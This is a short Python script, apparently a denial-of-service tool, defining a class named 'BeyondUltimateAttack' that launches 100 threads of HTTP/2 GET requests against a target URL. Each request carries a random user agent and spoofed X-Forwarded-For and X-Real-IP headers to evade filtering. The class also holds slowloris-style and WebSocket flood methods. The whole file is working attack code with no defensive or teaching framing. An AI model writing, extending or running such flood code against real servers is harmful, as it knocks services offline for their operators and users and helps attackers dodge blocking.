import random
import requests
import threading
import httpx
import websocket
from fake_useragent import UserAgent

class BeyondUltimateAttack:
    def __init__(self, target):
        self.target = target
        self.ua = UserAgent()
        self.http_client = httpx.Client(http2=True, verify=False)

    def get_random_user_agent(self):
        return self.ua.random

    def generate_headers(self):
        return {
            'User-Agent': self.get_random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'X-Forwarded-For': self.random_ip(),
            'X-Real-IP': self.random_ip(),
            'Referer': 'https://www.google.com/',
            'Cache-Control': 'max-age=0',
            'Dnt': '1',
            'Upgrade-Insecure-Requests': '1'
        }

    def random_ip(self):
        return '.'.join(str(random.randint(0, 255)) for _ in range(4))

    def send_http2_flood(self):
        headers = self.generate_headers()
        try:
            response = self.http_client.get(self.target, headers=headers, timeout=10)
            print(f"HTTP/2 Flood Sent: {response.status_code}")
        except Exception as e:
            print(f"Request Failed: {str(e)}")

    def send_slowloris(self):
        headers = self.generate_headers()
        try:
            with requests.Session() as s:
                conn = s.get(self.target, headers=headers, stream=True, timeout=999)
                print(f"Slowloris Attack Started: {conn.status_code}")
        except Exception as e:
            print(f"Slowloris Failed: {str(e)}")

    def websocket_flood(self):
        ws_url = self.target.replace("http", "ws")
        if not ws_url.startswith("ws://") and not ws_url.startswith("wss://"):
            print(f"WebSocket Attack Skipped: Target {self.target} is not a WebSocket server.")
            return

        try:
            ws = websocket.create_connection(ws_url, timeout=5)
            ws.send("FLOOD")
            ws.close()
            print(f"WebSocket Attack Sent: {ws_url}")
        except Exception as e:
            print(f"WebSocket Attack Failed: {str(e)}")

    def attack(self):
        threads = []
        for _ in range(100):
            t = threading.Thread(target=self.send_http2_flood)
            threads.append(t)
            t.start()

        for t in threads:
            t.join()
